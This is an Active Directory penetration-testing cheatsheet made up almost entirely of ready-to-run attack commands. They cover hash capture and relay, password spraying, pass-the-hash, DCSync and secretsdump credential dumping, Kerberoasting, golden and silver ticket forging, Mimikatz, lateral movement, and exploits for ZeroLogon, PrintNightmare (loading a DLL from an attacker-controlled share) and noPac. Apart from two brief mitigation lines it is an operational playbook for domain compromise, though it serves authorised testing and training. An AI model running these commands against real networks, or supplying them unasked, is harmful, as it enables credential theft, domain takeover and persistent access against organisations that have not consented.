# Active Directory Pentesting Cheatsheet

Quick reference for Active Directory enumeration, attacks, and post-exploitation.

---

## AD Overview

### Key Components
| Component | Description |
|-----------|-------------|
| Domain Controller (DC) | Central AD server, holds NTDS.dit |
| NTDS.dit | AD database with all user hashes |
| SYSVOL | Shared folder with GPOs and scripts |
| Kerberos | Authentication protocol |
| LDAP | Directory query protocol |

### Common Ports
| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 | RPC |
| 139 | NetBIOS |
| 389 | LDAP |
| 445 | SMB |
| 464 | Kerberos password change |
| 636 | LDAPS |
| 3268 | Global Catalog |
| 3389 | RDP |

---

## Initial Attack Vectors

### LLMNR/NBT-NS Poisoning

**Concept**: Intercept failed DNS lookups to capture NTLMv2 hashes.

```bash
# Start Responder
responder -I eth0 -rdwv

# Wait for authentication attempts...
# Captured hash format: user::domain:challenge:response:ntlmv2

# Crack with hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

**Mitigation**: Disable LLMNR and NBT-NS via GPO.

---

### SMB Relay

**Concept**: Relay captured credentials to another machine (if SMB signing is disabled).

```bash
# 1. Check for SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# 2. Configure Responder (disable SMB/HTTP)
# Edit /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 3. Start ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# 4. Start Responder
responder -I eth0 -rdwv

# For shell access:
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Then connect with nc to the specified port
```

---

### IPv6 DNS Takeover

```bash
# mitm6 spoofs as IPv6 DNS server
mitm6 -d domain.local

# Relay with ntlmrelayx
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local -wh fakewpad.domain.local -l loot
```

---

## Post-Compromise Enumeration

### Domain Information

```cmd
# From Windows
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

```powershell
# PowerView
. .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

### BloodHound

```bash
# Install
sudo apt install bloodhound neo4j

# Start neo4j
sudo neo4j console
# Navigate to http://localhost:7474, login neo4j:neo4j, change password

# Start BloodHound
bloodhound
```

```powershell
# Collect data with SharpHound
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName output.zip
```

```bash
# Or use bloodhound-python from Linux
bloodhound-python -u user -p 'password' -d domain.local -ns <DC-IP> -c all
```

**Key Queries**:
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "List all Kerberoastable Accounts"

---

## Credential Attacks

### Pass the Password

```bash
# Spray password across network
crackmapexec smb 192.168.1.0/24 -u username -d DOMAIN -p 'Password123'

# Check specific hosts
crackmapexec smb 192.168.1.100 -u username -d DOMAIN -p 'Password123'

# Execute command
crackmapexec smb 192.168.1.100 -u user -d DOMAIN -p 'pass' -x 'whoami'

# Get shell with psexec
impacket-psexec DOMAIN/user:'password'@192.168.1.100
```

### Pass the Hash

**Note**: Only NTLM hashes work, not NTLMv2.

```bash
# With CrackMapExec
crackmapexec smb 192.168.1.0/24 -u user -H <NTLM_hash> --local-auth

# Get shell
impacket-psexec user@192.168.1.100 -hashes <LM:NTLM>
impacket-wmiexec user@192.168.1.100 -hashes <LM:NTLM>

# Example (blank LM hash)
impacket-psexec administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Dumping Hashes

```bash
# With credentials
impacket-secretsdump DOMAIN/user:'password'@192.168.1.100

# With hash
impacket-secretsdump user@192.168.1.100 -hashes <LM:NTLM>

# From DC (DCSync)
impacket-secretsdump DOMAIN/admin:'password'@DC-IP -just-dc-ntlm
```

### Cracking Hashes

```bash
# NTLM hashes
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# NTLMv2 hashes (from Responder)
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt

# Kerberos TGS (Kerberoasting)
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# Kerberos AS-REP (AS-REP Roasting)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## Kerberos Attacks

### Kerberoasting

**Concept**: Request TGS tickets for SPNs, crack service account passwords offline.

```bash
# Get TGS tickets
impacket-GetUserSPNs DOMAIN/user:password -dc-ip <DC-IP> -request

# Save hash and crack
hashcat -m 13100 tgs_hash.txt rockyou.txt
```

```powershell
# From Windows with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

**Mitigation**: Strong service account passwords, Managed Service Accounts.

---

### AS-REP Roasting

**Concept**: Get AS-REP for accounts without pre-authentication.

```bash
# Find vulnerable accounts and get hashes
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat

# Crack
hashcat -m 18200 asrep_hash.txt rockyou.txt
```

---

### Golden Ticket

**Concept**: Forge TGT with krbtgt hash for persistent domain access.

```bash
# Get krbtgt hash (requires DA)
impacket-secretsdump DOMAIN/admin:password@DC-IP -just-dc-user krbtgt

# Create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain DOMAIN administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec DOMAIN/administrator@target -k -no-pass
```

---

### Silver Ticket

**Concept**: Forge TGS for specific service with service account hash.

```bash
# Create silver ticket for CIFS (file shares)
impacket-ticketer -nthash <service_hash> -domain-sid <domain_sid> -domain DOMAIN -spn CIFS/target.domain.local user

export KRB5CCNAME=user.ccache
impacket-smbclient //target.domain.local/share -k -no-pass
```

---

## Token Impersonation

```powershell
# Incognito (Meterpreter)
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# With Mimikatz
privilege::debug
token::elevate
```

---

## Mimikatz

```powershell
# Dump credentials
privilege::debug
sekurlsa::logonpasswords

# DCSync attack
lsadump::dcsync /domain:domain.local /user:Administrator

# Pass the hash
sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash>

# Golden ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_sid> /krbtgt:<hash> /ptt

# Dump SAM
lsadump::sam
```

---

## Lateral Movement

### PsExec
```bash
impacket-psexec DOMAIN/user:password@target
impacket-psexec user@target -hashes <LM:NTLM>
```

### WMIExec
```bash
impacket-wmiexec DOMAIN/user:password@target
```

### Evil-WinRM
```bash
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H <NTLM_hash>
```

### SMBExec
```bash
impacket-smbexec DOMAIN/user:password@target
```

---

## Known Vulnerabilities

### ZeroLogon (CVE-2020-1472)
```bash
# Test
python3 zerologon_tester.py DC-NAME DC-IP

# Exploit (resets DC password to empty)
python3 cve-2020-1472-exploit.py DC-NAME DC-IP

# Dump hashes
impacket-secretsdump -just-dc -no-pass DC-NAME\$@DC-IP
```

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
```bash
# Check vulnerability
rpcdump.py @DC-IP | grep MS-RPRN
rpcdump.py @DC-IP | grep MS-PAR

# Exploit
python3 CVE-2021-1675.py DOMAIN/user:password@DC-IP '\\attacker-ip\share\evil.dll'
```

### noPac (CVE-2021-42278 / CVE-2021-42287)
```bash
# Scanner
python3 scanner.py DOMAIN/user:password -dc-ip DC-IP

# Exploit
python3 noPac.py DOMAIN/user:password -dc-ip DC-IP -shell
```

---

## Useful Tools

| Tool | Purpose |
|------|---------|
| CrackMapExec | Swiss army knife for AD |
| Impacket | Python AD tools suite |
| BloodHound | AD attack path visualization |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos abuse |
| PowerView | PowerShell AD recon |
| Evil-WinRM | WinRM shell |
| Responder | LLMNR/NBT-NS poisoning |
| kerbrute | Kerberos brute forcing |

---

## Attack Flow

```
1. LLMNR/NBT-NS Poisoning
   ↓
2. Crack hashes / Relay attacks
   ↓
3. Enumerate with BloodHound
   ↓
4. Kerberoast service accounts
   ↓
5. Lateral movement (Pass the Hash/Password)
   ↓
6. Find path to Domain Admin
   ↓
7. DCSync for all hashes
   ↓
8. Golden Ticket for persistence
```

---

## Resources

- [WADComs](https://wadcoms.github.io/) - AD command reference
- [HackTricks AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [ired.team](https://www.ired.team/)
